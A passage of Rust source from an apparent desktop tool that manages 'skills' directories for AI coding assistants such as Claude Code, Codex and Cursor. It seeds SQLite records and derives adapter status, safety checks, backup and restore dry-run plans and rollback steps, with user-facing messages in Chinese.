                    if target.detected { 1 } else { 0 },
                    if target.managed { 1 } else { 0 },
                    if target.required { 1 } else { 0 },
                    target.preflight_status,
                    target.risk_level,
                    target.blocker,
                    timestamp
                ],
            )
            .map_err(|error| {
                format!(
                    "Cannot seed backup target {} for {}: {}",
                    target.target_path, target.agent_name, error
                )
            })?;
    }

    Ok(())
}

fn seed_backup_dry_run(
    transaction: &rusqlite::Transaction<'_>,
    items: &[BackupDryRunItemCard],
    timestamp: &str,
) -> Result<(), String> {
    for item in items {
        transaction
            .execute(
                "INSERT INTO backup_dry_run_items (
                    id, backup_target_id, adapter_id, agent_name, action,
                    target_path, backup_path, status, risk_level, summary, created_at
                ) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11)",
                params![
                    item.id,
                    item.backup_target_id,
                    item.adapter_id,
                    item.agent_name,
                    item.action,
                    item.target_path,
                    item.backup_path,
                    item.status,
                    item.risk_level,
                    item.summary,
                    timestamp
                ],
            )
            .map_err(|error| {
                format!(
                    "Cannot seed backup dry-run item {} for {}: {}",
                    item.action, item.agent_name, error
                )
            })?;
    }

    Ok(())
}

fn seed_restore_dry_run(
    transaction: &rusqlite::Transaction<'_>,
    items: &[RestoreDryRunItemCard],
    timestamp: &str,
) -> Result<(), String> {
    for item in items {
        transaction
            .execute(
                "INSERT INTO restore_dry_run_items (
                    id, backup_target_id, adapter_id, agent_name, action,
                    target_path, backup_path, status, risk_level, summary, created_at
                ) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, ?9, ?10, ?11)",
                params![
                    item.id,
                    item.backup_target_id,
                    item.adapter_id,
                    item.agent_name,
                    item.action,
                    item.target_path,
                    item.backup_path,
                    item.status,
                    item.risk_level,
                    item.summary,
                    timestamp
                ],
            )
            .map_err(|error| {
                format!(
                    "Cannot seed restore dry-run item {} for {}: {}",
                    item.action, item.agent_name, error
                )
            })?;
    }

    Ok(())
}

fn seed_rollback_plan(
    transaction: &rusqlite::Transaction<'_>,
    snapshot: &LegacySnapshot,
    snapshot_id: &str,
    timestamp: &str,
) -> Result<(), String> {
    let steps = rollback_plan_steps(snapshot, snapshot_id);

    for step in steps {
        transaction
            .execute(
                "INSERT OR REPLACE INTO rollback_plan_steps (
                    id, snapshot_id, step_order, title, risk_level, status, summary, created_at
                ) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)",
                params![
                    step.id,
                    step.snapshot_id,
                    step.step_order as i64,
                    step.title,
                    step.risk_level,
                    step.status,
                    step.summary,
                    timestamp
                ],
            )
            .map_err(|error| format!("Cannot seed rollback plan step: {}", error))?;
    }

    Ok(())
}

fn seed_presets(
    transaction: &rusqlite::Transaction<'_>,
    all_skill_ids: &[String],
    skill_ids_by_category: &BTreeMap<String, Vec<String>>,
    enabled_state: &EnabledState,
    timestamp: &str,
) -> Result<(), String> {
    insert_preset(
        transaction,
        "preset-all",
        "全部技能",
        "中央技能库中的全部已索引 Skill。",
        "mint",
        all_skill_ids,
        enabled_state,
        timestamp,
    )?;

    for (index, (category, skill_ids)) in skill_ids_by_category.iter().enumerate() {
        let preset_id = stable_id("preset", category);
        insert_preset(
            transaction,
            &preset_id,
            category,
            &format!("自动从分类“{}”生成的 Preset。", category),
            preset_color(index),
            skill_ids,
            enabled_state,
            timestamp,
        )?;
    }

    Ok(())
}

#[allow(clippy::too_many_arguments)]
fn insert_preset(
    transaction: &rusqlite::Transaction<'_>,
    preset_id: &str,
    name: &str,
    description: &str,
    color: &str,
    skill_ids: &[String],
    enabled_state: &EnabledState,
    timestamp: &str,
) -> Result<(), String> {
    let enabled = enabled_state
        .presets
        .get(preset_id)
        .copied()
        .unwrap_or(true);
    transaction
        .execute(
            "INSERT INTO presets (
                id, name, description, color, enabled, created_at, updated_at
            ) VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?6)",
            params![
                preset_id,
                name,
                description,
                color,
                if enabled { 1 } else { 0 },
                timestamp
            ],
        )
        .map_err(|error| format!("Cannot seed preset {}: {}", name, error))?;

    for skill_id in skill_ids {
        transaction
            .execute(
                "INSERT OR IGNORE INTO preset_skills (
                    preset_id, skill_id
                ) VALUES (?1, ?2)",
                params![preset_id, skill_id],
            )
            .map_err(|error| format!("Cannot link preset skill {}: {}", name, error))?;
    }

    Ok(())
}

fn link_skill_tag(
    transaction: &rusqlite::Transaction<'_>,
    skill_id: &str,
    tag_name: &str,
    timestamp: &str,
) -> Result<(), String> {
    let tag_id = upsert_tag_in_transaction(transaction, tag_name)?;
    transaction
        .execute(
            "INSERT OR IGNORE INTO skill_tags (skill_id, tag_id) VALUES (?1, ?2)",
            params![skill_id, tag_id],
        )
        .map_err(|error| format!("Cannot link skill tag {}: {}", tag_name, error))?;
    let _ = timestamp;
    Ok(())
}

fn link_source_tag(
    transaction: &rusqlite::Transaction<'_>,
    source_id: &str,
    tag_name: &str,
    timestamp: &str,
) -> Result<(), String> {
    let tag_id = upsert_tag_in_transaction(transaction, tag_name)?;
    transaction
        .execute(
            "INSERT OR IGNORE INTO source_tags (source_id, tag_id) VALUES (?1, ?2)",
            params![source_id, tag_id],
        )
        .map_err(|error| format!("Cannot link source tag {}: {}", tag_name, error))?;
    let _ = timestamp;
    Ok(())
}

fn upsert_tag_in_transaction(
    transaction: &rusqlite::Transaction<'_>,
    name: &str,
) -> Result<String, String> {
    let name = compact_note(name);
    if name.is_empty() {
        return Err("Tag name is required.".to_string());
    }
    let tag_id = stable_id("tag", &name.to_lowercase());
    transaction
        .execute(
            "INSERT OR IGNORE INTO tags (id, name, color) VALUES (?1, ?2, ?3)",
            params![&tag_id, &name, tag_color(&name)],
        )
        .map_err(|error| format!("Cannot upsert tag {}: {}", name, error))?;
    Ok(tag_id)
}

fn derive_agent_adapters(agents: &[AgentCard]) -> Vec<AgentAdapterCard> {
    agent_adapter_catalog()
        .into_iter()
        .map(|mut adapter| {
            if let Some(agent) = agents
                .iter()
                .find(|agent| agent_matches_adapter(&adapter.id, agent))
            {
                adapter.detected = agent.detected;
                adapter.managed = agent.managed;
                adapter.enabled = agent.detected && agent.managed;
                adapter.status = if agent.detected && agent.managed {
                    "ready".to_string()
                } else if agent.detected {
                    "detected-unmanaged".to_string()
                } else {
                    "not-detected".to_string()
                };
                if !agent.path.is_empty() {
                    adapter.skills_path_hint = agent.path.clone();
                }
            }
            adapter
        })
        .collect()
}

fn derive_agent_doctors(
    diagnostics: Option<&Value>,
    adapters: &[AgentAdapterCard],
) -> Vec<adapter_doctor::AgentDoctorCard> {
    let diagnostic_agents = diagnostics
        .and_then(|root| root.get("agents"))
        .and_then(Value::as_array);
    let home_dir = std::env::var("USERPROFILE")
        .or_else(|_| std::env::var("HOME"))
        .unwrap_or_default();

    adapters
        .iter()
        .map(|adapter| {
            let diagnostic = diagnostic_agents.and_then(|agents| {
                agents
                    .iter()
                    .find(|agent| json_string(agent, "id").eq_ignore_ascii_case(&adapter.id))
            });
            let command_name = match adapter.id.as_str() {
                "claude" => "claude",
                "codex" => "codex",
                "antigravity" => "antigravity",
                "gemini" => "gemini",
                "cursor" => "cursor",
                "windsurf" => "windsurf",
                "copilot" => "copilot",
                "aider" => "aider",
                "opencode" => "opencode",
                "cline" => "cline",
                "roo-code" => "roo",
                _ => adapter.id.as_str(),
            };
            let command_path = diagnostic
                .map(|agent| json_string(agent, "command"))
                .unwrap_or_default();
            let command_detail = diagnostic
                .and_then(|agent| agent.get("detectionKinds"))
                .and_then(Value::as_array)
                .map(|items| {
                    items
                        .iter()
                        .filter_map(Value::as_str)
                        .collect::<Vec<_>>()
                        .join(", ")
                })
                .unwrap_or_default();
            let commands = vec![adapter_doctor::CommandProbeEvidence {
                command: command_name.to_string(),
                found_on_path: !command_path.trim().is_empty(),
                resolved_path: command_path,
                version: String::new(),
                detail: command_detail.clone(),
            }];

            let mut apps = Vec::new();
            if diagnostic
                .map(|agent| json_bool(agent, "desktopDetected"))
                .unwrap_or(false)
            {
                apps.push(adapter_doctor::AppProbeEvidence {
                    product_id: format!("{}-desktop", adapter.id),
                    display_name: adapter.name.clone(),
                    role: "desktop-app".to_string(),
                    installed: true,
                    running: false,
                    executable_path: String::new(),
                    evidence_source: "diagnostics".to_string(),
                    detail: command_detail.clone(),
                });
            }
            if diagnostic
                .map(|agent| json_bool(agent, "codeDetected"))
                .unwrap_or(false)
            {
                apps.push(adapter_doctor::AppProbeEvidence {
                    product_id: format!("{}-code", adapter.id),
                    display_name: adapter.name.clone(),
                    role: "code-app".to_string(),
                    installed: true,
                    running: false,
                    executable_path: String::new(),
                    evidence_source: "diagnostics".to_string(),
                    detail: command_detail.clone(),
                });
            }

            let paths = diagnostic
                .and_then(|agent| agent.get("skillsDirs"))
                .and_then(Value::as_array)
                .map(|items| {
                    items
                        .iter()
                        .map(|item| adapter_doctor::PathProbeEvidence {
                            path: json_string(item, "path"),
                            purpose: "skills-directory".to_string(),
                            exists: json_bool(item, "exists"),
                            is_directory: json_bool(item, "exists"),
                            writable: json_bool(item, "writable"),
                            is_link: json_bool(item, "isLink"),
                            contains_skill_md: json_bool(item, "containsSkillMd"),
                            detail: String::new(),
                        })
                        .collect::<Vec<_>>()
                })
                .unwrap_or_default();

            adapter_doctor::diagnose_adapter(&adapter_doctor::AdapterDoctorInput {
                adapter_id: adapter.id.clone(),
                adapter_name: adapter.name.clone(),
                detection_kind: adapter.detection_kind.clone(),
                path_hint: adapter.skills_path_hint.clone(),
                home_dir: home_dir.clone(),
                redact_paths: true,
                commands,
                apps,
                packages: Vec::new(),
                paths,
            })
        })
        .collect()
}

fn derive_agent_skill_statuses(
    root: &Path,
    skills: &[SkillCard],
    agents: &[AgentCard],
) -> Vec<AgentSkillStatusCard> {
    let mut statuses = Vec::new();
    let active_root = active_skills_dir(root);
    let active_entries = collect_active_agent_skill_entries(&active_root).unwrap_or_default();

    for agent in agents {
        for skill in skills {
            let active_entry_names = active_agent_entry_names_for_skill(skill, &active_entries);
            let manifest_eligible = active_entry_names.is_empty()
                || active_entry_names.iter().any(|entry_name| {
                    let skill_dir = active_root.join(entry_name);
                    read_skill_name(&skill_dir.join("SKILL.md")).is_some()
                        && !read_skill_description(&skill_dir).trim().is_empty()
                });
            let preferred_entry_name = active_entry_names
                .first()
                .cloned()
                .unwrap_or_else(|| skill.folder_name.clone());
            let agent_skills_path = expand_user_home_path(&agent.path);
            let expected_path = if agent_skills_path.as_os_str().is_empty() {
                PathBuf::new()
            } else {
                agent_skills_path.join(&preferred_entry_name)
            };
            let expected_path_text = if expected_path.as_os_str().is_empty() {
                String::new()
            } else {
                expected_path.display().to_string()
            };
            let installed_path = if agent_skills_path.as_os_str().is_empty() {
                None
            } else {
                active_entry_names
                    .iter()
                    .map(|entry_name| agent_skills_path.join(entry_name))
                    .find(|path| path.join("SKILL.md").is_file())
            };
            let installed = installed_path.is_some();
            let installed_entry_name = installed_path
                .as_ref()
                .and_then(|path| path.file_name())
                .and_then(|value| value.to_str())
                .unwrap_or(&preferred_entry_name)
                .to_string();
            let routed_via_parent = !skill.is_router_hub
                && installed
                && active_entries.iter().any(|entry| {
                    entry.name.eq_ignore_ascii_case(&installed_entry_name)
                        && matches!(
                            &entry.dependency,
                            Some(GeneratedAgentSkillDependency::Source(source))
                                if normalize_skill_lookup(source)
                                    == normalize_skill_lookup(&skill.source)
                        )
                });
            let target_path = if let Some(installed_path) = installed_path {
                installed_path
                    .canonicalize()
                    .unwrap_or_else(|_| installed_path.clone())
                    .display()
                    .to_string()
            } else {
                String::new()
            };
            let (status, summary) = if !skill.enabled {
                (
                    "skill-disabled",
                    format!("{} 已停用，不会发布到 {}。", skill.name, agent.name),
                )
            } else if !manifest_eligible {
                (
                    "invalid-manifest",
                    format!(
                        "{} 的 SKILL.md 缺少有效 name 或 description，已停止发布。",
                        skill.name
                    ),
                )
            } else if !agent.detected {
                (
                    "agent-missing",
                    format!("{} 未检测到，暂不能判断此 Skill。", agent.name),
                )
            } else if !agent.enabled {
                (
                    "agent-disabled",
                    format!("{} 已检测但未启用接管。", agent.name),
                )
            } else if routed_via_parent {
                (
                    "routed-via-parent",
                    format!(
                        "{} 已归入父 Skill {}；Agent 调用父入口后会按来源路径加载此子 Skill。",
                        skill.name, installed_entry_name
                    ),
                )
            } else if installed {
                (
                    "installed",
                    if agent.id.to_lowercase().contains("codex")
                        || agent.name.to_lowercase().contains("codex")
                    {
                        format!(
                            "{} 已交付；Codex 用 /skills 或 ${}，ChatGPT 用 @{}。",
                            agent.name, installed_entry_name, installed_entry_name
                        )
                    } else {
                        format!("{} 已能看到 {}。", agent.name, installed_entry_name)
                    },
                )
            } else if active_entry_names.is_empty() {
                (
                    "missing",
                    format!(
                        "{} 尚未形成可交付的活动入口；同步后会重新计算路由。",
                        skill.name
                    ),
                )
            } else {
                (
                    "missing",
                    format!(
                        "{} 尚未收到 {}；点击同步可重建托管链接。",
                        agent.name, preferred_entry_name
                    ),
                )
            };

            statuses.push(AgentSkillStatusCard {
                id: stable_id(
                    "agent-skill-status",
                    &format!("{}::{}", agent.id, skill.folder_name),
                ),
                agent_id: agent.id.clone(),
                agent_name: agent.name.clone(),
                skill_name: skill.name.clone(),
                skill_folder_name: skill.folder_name.clone(),
                status: status.to_string(),
                expected_path: expected_path_text,
                target_path,
                summary,
            });
        }
    }

    statuses
}

fn expand_user_home_path(value: &str) -> PathBuf {
    let trimmed = value.trim();
    if trimmed.is_empty() {
        return PathBuf::new();
    }
    let home = std::env::var("USERPROFILE")
        .or_else(|_| std::env::var("HOME"))
        .unwrap_or_default();
    if home.is_empty() {
        return PathBuf::from(trimmed);
    }
    if trimmed == "~" {
        return PathBuf::from(home);
    }
    if let Some(relative) = trimmed
        .strip_prefix("~\\")
        .or_else(|| trimmed.strip_prefix("~/"))
    {
        return PathBuf::from(home).join(relative);
    }
    PathBuf::from(trimmed)
}

fn derive_adapter_safety_checks(adapters: &[AgentAdapterCard]) -> Vec<AdapterSafetyCheckCard> {
    let mut checks = Vec::new();

    for adapter in adapters {
        checks.push(adapter_safety_check(
            adapter,
            "detection",
            if adapter.detected { "ok" } else { "info" },
            if adapter.id == "claude" && adapter.detected {
                "已检测到 Claude Desktop 或 Claude Code；只有 Code 能力会接管本地 Skills。"
            } else if adapter.id == "codex" && adapter.detected {
                "已检测到 ChatGPT Desktop 或 OpenAI Codex；本地 Skills 使用官方用户级 .agents/skills 目录。"
            } else if adapter.detected {
                "本机已检测到该 AI 工具。"
            } else {
                "本机未检测到该 AI 工具；保持未启用，不创建假目录。"
            },
        ));
        checks.push(adapter_safety_check(
            adapter,
            "skills-path",
            if adapter.skills_path_hint.is_empty() {
                "warn"
            } else {
                "ok"
            },
            if adapter.skills_path_hint.is_empty() {
                "该适配器暂未声明默认 Skills 目录；后续必须由用户手动指定。"
            } else if adapter.id == "claude" {
                "本地目录供 Claude Code/桌面 Code 模式使用；Chat/Cowork 需在 Claude 设置中导入 ZIP。"
            } else if adapter.id == "codex" {
                "ChatGPT Desktop 与 Codex 共用官方用户级 .agents/skills；旧 .codex/skills 仅作兼容。"
            } else {
                "已声明默认 Skills 目录，仅作为路径提示，不会自动写入。"
            },
        ));
        checks.push(adapter_safety_check(
            adapter,
            "write-gate",
            if adapter.detected && adapter.managed {
                "ok"
            } else if adapter.detected {
                "warn"
            } else {
                "info"
            },
            if adapter.detected && adapter.managed {
                "本机检测与接管状态完整；未来同步前仍需快照和回滚。"
            } else if adapter.detected {
                "本机已检测但尚未接管；未来写入前需要用户确认。"
            } else {
                "未检测到工具；禁止执行接管写入。"
            },
        ));
    }

    checks
}

fn adapter_safety_check(
    adapter: &AgentAdapterCard,
    check_key: &str,
    status: &str,
    summary: &str,
) -> AdapterSafetyCheckCard {
    AdapterSafetyCheckCard {
        id: stable_id("adapter-check", &format!("{}-{}", adapter.id, check_key)),
        adapter_id: adapter.id.clone(),
        check_key: check_key.to_string(),
        status: status.to_string(),
        summary: summary.to_string(),
    }
}

fn derive_adapter_capabilities(adapters: &[AgentAdapterCard]) -> Vec<AdapterCapabilityCard> {
    let mut capabilities = Vec::new();

    for adapter in adapters {
        let has_path = !adapter.skills_path_hint.is_empty();
        let project_scope = matches!(
            adapter.id.as_str(),
            "claude"
                | "codex"
                | "antigravity"
                | "cursor"
                | "gemini-cli"
                | "opencode"
                | "windsurf"
                | "hermes"
                | "openclaw"
        );
        capabilities.push(adapter_capability(
            adapter,
            "global-scope",
            has_path,
            if has_path {
                "支持全局 Skills 目录接管。"
            } else {
                "暂未声明全局 Skills 目录，需用户手动配置。"
            },
        ));
        capabilities.push(adapter_capability(
            adapter,
            "project-scope",
            project_scope,
            if project_scope {
                "支持后续扩展为项目级工作区。"
            } else {
                "项目级工作区暂不启用，避免误写未知工具配置。"
            },
        ));
        capabilities.push(adapter_capability(
            adapter,
            "copy-fallback",
            has_path,
            if has_path {
                "未来同步时可在软链接失败后降级为复制。"
            } else {
                "无默认路径时不允许自动复制。"
            },
        ));
        capabilities.push(adapter_capability(
            adapter,
            "instructions-generation",
            project_scope,
            if project_scope {
                "未来可生成 AGENTS.md / 工具说明索引。"
            } else {
                "暂不生成工具说明索引。"
            },
        ));
    }

    capabilities
}

fn derive_backup_targets(root: &Path, adapters: &[AgentAdapterCard]) -> Vec<BackupTargetCard> {
    adapters
        .iter()
        .map(|adapter| {
            let has_target = !adapter.skills_path_hint.trim().is_empty();
            let backup_path = private_state_dir(root)
                .join("backups")
                .join(&adapter.id)
                .join("skills")
                .display()
                .to_string();
            let required = adapter.detected || adapter.managed || adapter.enabled;
            let (preflight_status, risk_level, blocker) =
                backup_target_preflight(adapter, has_target);

            BackupTargetCard {
                id: stable_id("backup-target", &adapter.id),
                adapter_id: adapter.id.clone(),
                agent_name: adapter.name.clone(),
                target_path: if has_target {
                    adapter.skills_path_hint.clone()
                } else {
                    "未声明默认 Skills 目录".to_string()
                },
                backup_path,
                detected: adapter.detected,
                managed: adapter.managed,
                required,
                preflight_status: preflight_status.to_string(),
                risk_level: risk_level.to_string(),
                blocker: blocker.to_string(),
            }
        })
        .collect()
}

fn backup_target_preflight(
    adapter: &AgentAdapterCard,
    has_target: bool,
) -> (&'static str, &'static str, &'static str) {
    if !adapter.detected {
        return (
            "skipped",
            "low",
            "未检测到该工具；不会创建假目录，也不会执行接管写入。",
        );
    }
    if !has_target {
        return (
            "blocked",
            "high",
            "缺少目标目录，必须由用户手动指定后才能备份或接管。",
        );
    }
    if !adapter.managed {
        return (
            "blocked",
            "medium",
            "检测到但尚未接管；真实同步前必须先完成备份和接管确认。",
        );
    }
    (
        "required",
        "medium",
        "已接管目标目录；真实同步前必须先生成可恢复备份。",
    )
}

fn derive_restore_dry_run(backup_targets: &[BackupTargetCard]) -> Vec<RestoreDryRunItemCard> {
    backup_targets
        .iter()
        .map(|target| {
            let (action, status, risk_level, summary) = restore_dry_run_plan(target);
            RestoreDryRunItemCard {
                id: stable_id("restore-dry-run", &target.id),
                backup_target_id: target.id.clone(),
                adapter_id: target.adapter_id.clone(),
                agent_name: target.agent_name.clone(),
                action: action.to_string(),
                target_path: target.target_path.clone(),
                backup_path: target.backup_path.clone(),
                status: status.to_string(),
                risk_level: risk_level.to_string(),
                summary: summary.to_string(),
            }
        })
        .collect()
}

fn derive_backup_dry_run(backup_targets: &[BackupTargetCard]) -> Vec<BackupDryRunItemCard> {
    backup_targets
        .iter()
        .map(|target| {
            let (action, status, risk_level, summary) = backup_dry_run_plan(target);
            BackupDryRunItemCard {
                id: stable_id("backup-dry-run", &target.id),
                backup_target_id: target.id.clone(),
                adapter_id: target.adapter_id.clone(),
                agent_name: target.agent_name.clone(),
                action: action.to_string(),
                target_path: target.target_path.clone(),
                backup_path: target.backup_path.clone(),
                status: status.to_string(),
                risk_level: risk_level.to_string(),
                summary: summary.to_string(),
            }
        })
        .collect()
}

fn backup_dry_run_plan(
    target: &BackupTargetCard,
) -> (&'static str, &'static str, &'static str, &'static str) {
    match target.preflight_status.as_str() {
        "skipped" => (
            "skip",
            "skipped",
            "low",
            "未检测到该工具，备份预演会跳过此目标，不创建备份目录。",
        ),
        "blocked" => (
            "block-backup",
            "blocked",
            "high",
            "当前目标仍被阻断，备份预演只报告原因，不复制任何文件。",
        ),
        "ready" => (
            "verify-backup",
            "ready",
            "low",
            "备份已存在时，未来会先校验备份完整性，再允许进入恢复预演。",
        ),
        _ => (
            "copy-to-backup",
            "planned",
            "medium",
            "真实同步前会先检查目标路径边界，再把目标目录复制到备份位置；当前仍只预演。",
        ),
    }
}

fn restore_dry_run_plan(
    target: &BackupTargetCard,
) -> (&'static str, &'static str, &'static str, &'static str) {
    match target.preflight_status.as_str() {
        "skipped" => (
            "skip",
            "skipped",
            "low",
            "未检测到该工具，恢复预演会跳过此目标，不创建目录、不写入文件。",
        ),
        "blocked" => (
            "block-restore",
            "blocked",
            "high",
            "当前目标仍被阻断，恢复预演只能报告原因，不能进入真实恢复。",
        ),
        "ready" => (
            "restore-from-backup",
            "ready",
            "medium",
            "备份已存在时，未来可从备份位置恢复到目标目录；当前仍只做预演。",
        ),
        _ => (
            "prepare-restore",
            "planned",
            "medium",
            "真实同步前会先生成备份；恢复预演会列出从备份位置还原到目标目录的计划。",
        ),
    }
}

fn adapter_capability(
    adapter: &AgentAdapterCard,
    capability_key: &str,
    enabled: bool,
    summary: &str,
) -> AdapterCapabilityCard {
    AdapterCapabilityCard {
        id: stable_id(
            "adapter-capability",
            &format!("{}-{}", adapter.id, capability_key),
        ),
        adapter_id: adapter.id.clone(),
        capability_key: capability_key.to_string(),
        enabled,
        summary: summary.to_string(),
    }
}

fn agent_adapter_catalog() -> Vec<AgentAdapterCard> {
    vec![
        agent_adapter(
            "claude",
            "Claude Desktop / Claude Code",
            "Anthropic",
            "~\\.claude\\skills",
            "global",
        ),
        agent_adapter(
            "codex",
            "ChatGPT Desktop / OpenAI Codex",
            "OpenAI",
            "~\\.agents\\skills",
            "global",
        ),
        agent_adapter(
            "antigravity",
            "Antigravity",
            "Google",
            "~\\.gemini\\antigravity\\skills",
            "global",
        ),
        agent_adapter(
            "cursor",
            "Cursor",
            "Anysphere",
            "~\\.cursor\\skills",
            "global",
        ),
        agent_adapter(
            "gemini-cli",
            "Gemini CLI",
            "Google",
            "~\\.gemini\\skills",
            "global",
        ),
        agent_adapter(
            "opencode",
            "OpenCode",
            "OpenCode",
            "~\\.config\\opencode\\skills",
            "global",
        ),
        agent_adapter(
            "github-copilot",
            "GitHub Copilot",
            "GitHub",
            "~\\.copilot\\skills",
            "global",
        ),
        agent_adapter(
            "windsurf",
            "Windsurf",
            "Codeium",
            "~\\.codeium\\windsurf\\skills",
            "global",
        ),
        agent_adapter("kiro", "Kiro CLI", "Kiro", "~\\.kiro\\skills", "global"),
        agent_adapter(
            "hermes",
            "Hermes Agent",
            "Hermes",
            "~\\.hermes\\skills",
            "global",
        ),
        agent_adapter(
            "openclaw",
            "OpenClaw",
            "OpenClaw",
            "~\\.openclaw\\skills",
            "global",
        ),
        agent_adapter("amp", "Amp", "Sourcegraph", "", "global"),
    ]
}

fn agent_adapter(
    id: &str,
    name: &str,
    vendor: &str,
    skills_path_hint: &str,
    install_scope: &str,
) -> AgentAdapterCard {
    AgentAdapterCard {
        id: id.to_string(),
        name: name.to_string(),
        vendor: vendor.to_string(),
        skills_path_hint: skills_path_hint.to_string(),
        detection_kind: "skills-folder".to_string(),
        install_scope: install_scope.to_string(),
        capability_level: "skills".to_string(),
        docs_url: String::new(),
        status: "not-detected".to_string(),
        detected: false,
        managed: false,
        enabled: false,
    }
}

fn agent_matches_adapter(adapter_id: &str, agent: &AgentCard) -> bool {
    let haystack = format!("{} {}", agent.id, agent.name).to_lowercase();
    match adapter_id {
        "claude" => haystack.contains("claude"),
        "codex" => haystack.contains("codex"),
        "antigravity" => haystack.contains("antigravity"),
        "cursor" => haystack.contains("cursor"),
        "gemini-cli" => haystack.contains("gemini"),
        "opencode" => haystack.contains("opencode") || haystack.contains("open code"),
        "github-copilot" => haystack.contains("copilot"),
        "windsurf" => haystack.contains("windsurf"),
        "kiro" => haystack.contains("kiro"),
        "hermes" => haystack.contains("hermes"),
        "openclaw" => haystack.contains("openclaw"),
        "amp" => haystack.split_whitespace().any(|part| part == "amp"),
        _ => haystack.contains(adapter_id),
    }
}

fn derive_workspaces(root: &Path, agents: &[AgentCard], total_skills: usize) -> Vec<WorkspaceCard> {
    let mut workspaces = vec![WorkspaceCard {
        id: "workspace-global".to_string(),
        name: "全局工作区".to_string(),
        scope: "global".to_string(),
        path: root.display().to_string(),
        enabled: true,
        agent_count: agents.iter().filter(|agent| agent.detected).count(),
        skill_count: total_skills,
    }];

    for agent in agents.iter().filter(|agent| agent.detected) {
        workspaces.push(WorkspaceCard {
            id: stable_id("workspace-agent", &agent.id),
            name: format!("{} 工作区", agent.name),
            scope: "agent".to_string(),
            path: agent.path.clone(),
            enabled: agent.detected,
            agent_count: 1,
            skill_count: if agent.managed { total_skills } else { 0 },
        });
    }

    let app_next = root.join("app-next");
    if app_next.exists() {
        workspaces.push(WorkspaceCard {
            id: "workspace-project-app-next".to_string(),
            name: "AI SkillHub 项目工作区".to_string(),
            scope: "project".to_string(),
            path: app_next.display().to_string(),
            enabled: true,
            agent_count: 0,
            skill_count: 0,
        });
    }

    workspaces
}

fn derive_project_scans(root: &Path, workspaces: &[WorkspaceCard]) -> Vec<ProjectScanCard> {
    workspaces
        .iter()
        .filter(|workspace| workspace.scope == "project")
        .filter_map(|workspace| {
            let path = PathBuf::from(&workspace.path);
            if !path.exists() {
                return None;
            }
            Some(ProjectScanCard {
                id: stable_id("project-scan", &workspace.id),
                workspace_id: workspace.id.clone(),
                path: workspace.path.clone(),
                has_git: has_git_marker(&path, root),
                has_package_json: path.join("package.json").exists(),
                has_cargo_toml: path.join("src-tauri").join("Cargo.toml").exists()
                    || path.join("Cargo.toml").exists(),
                has_tauri_config: path.join("src-tauri").join("tauri.conf.json").exists(),
                has_agents_md: path.join("AGENTS.md").exists(),
                has_claude_md: path.join("CLAUDE.md").exists(),
                has_readme_md: path.join("README.md").exists(),
                file_count: count_project_files(&path, 10_000),
                scanned_at: unix_timestamp_string(),
            })
        })
        .collect()
}

fn has_git_marker(path: &Path, root: &Path) -> bool {
    path.join(".git").exists() || root.join(".git").exists()
}

fn count_project_files(path: &Path, limit: usize) -> usize {
    fn visit(path: &Path, limit: usize, count: &mut usize) {
        if *count >= limit {
            return;
        }
        let Ok(entries) = fs::read_dir(path) else {
            return;
        };
        for entry in entries.flatten() {
            if *count >= limit {
                return;
            }
            let entry_path = entry.path();
            let name = entry.file_name().to_string_lossy().to_string();
            if entry_path.is_dir() {
                if matches!(
                    name.as_str(),
                    ".git" | "node_modules" | "target" | "dist" | ".pnpm-store" | ".npm-cache"
                ) {
                    continue;
                }
                visit(&entry_path, limit, count);
            } else if entry_path.is_file() {
                *count += 1;
            }
        }
    }

    let mut count = 0;
    visit(path, limit, &mut count);
    count
}

fn derive_presets(skills: &[SkillCard]) -> Vec<PresetCard> {
    let mut counts: BTreeMap<String, usize> = BTreeMap::new();
    for skill in skills {
        *counts.entry(category_label(&skill.category)).or_insert(0) += 1;
    }

    let mut presets = vec![PresetCard {
        id: "preset-all".to_string(),
        name: "全部技能".to_string(),
        description: "中央技能库中的全部已索引 Skill。".to_string(),
        color: "mint".to_string(),
        enabled: true,
        skill_count: skills.len(),
        workspace_count: 0,
    }];

    for (index, (category, count)) in counts.into_iter().enumerate() {
        presets.push(PresetCard {
            id: stable_id("preset", &category),
            name: category.clone(),
            description: format!("自动从分类“{}”生成的 Preset。", category),
            color: preset_color(index).to_string(),
            enabled: true,
            skill_count: count,
            workspace_count: 0,
        });
    }

    presets
}

fn rollback_plan_steps(snapshot: &LegacySnapshot, snapshot_id: &str) -> Vec<RollbackPlanStepCard> {
    let detected_agents = snapshot
        .agents
        .iter()
        .filter(|agent| agent.detected)
        .count();
    let managed_agents = snapshot.agents.iter().filter(|agent| agent.managed).count();
    let required_backups = snapshot
        .backup_targets
        .iter()
        .filter(|target| target.required)
        .count();
    let blocked_backups = snapshot
        .backup_targets
        .iter()
        .filter(|target| target.preflight_status == "blocked")
        .count();

    vec![
        RollbackPlanStepCard {
            id: stable_id("rollback-step", &format!("{}-sqlite-baseline", snapshot_id)),
            snapshot_id: snapshot_id.to_string(),
            step_order: 1,
            title: "冻结 v2 SQLite 基线".to_string(),
            risk_level: "low".to_string(),
            status: "ready".to_string(),
            summary: format!(
                "已记录 {} 个 Skill、{} 个来源、{} 个 AI 工具，可作为当前只读索引基线。",
                snapshot.skills.len(),
                snapshot.sources.len(),
                snapshot.agents.len()
            ),
        },
        RollbackPlanStepCard {
            id: stable_id("rollback-step", &format!("{}-write-boundary", snapshot_id)),
            snapshot_id: snapshot_id.to_string(),
            step_order: 2,
            title: "确认写入边界仍关闭".to_string(),
            risk_level: "low".to_string(),
            status: "ready".to_string(),
            summary: "当前 v2 只写自己的 SQLite；不会创建、删除或替换 Claude/Codex/Antigravity 的真实 Skills 目录。".to_string(),
        },
        RollbackPlanStepCard {
            id: stable_id("rollback-step", &format!("{}-target-backup", snapshot_id)),
            snapshot_id: snapshot_id.to_string(),
            step_order: 3,
            title: "备份目标 AI 工具目录".to_string(),
            risk_level: "medium".to_string(),
            status: if detected_agents > 0 { "planned" } else { "locked" }.to_string(),
            summary: format!(
                "检测到 {} 个 AI 工具，其中 {} 个已接管；真实同步前必须备份 {} 个目标目录，当前 {} 个目标仍有阻断原因。",
                detected_agents, managed_agents, required_backups, blocked_backups
            ),
        },
        RollbackPlanStepCard {
            id: stable_id("rollback-step", &format!("{}-dry-run-restore", snapshot_id)),
            snapshot_id: snapshot_id.to_string(),
            step_order: 4,
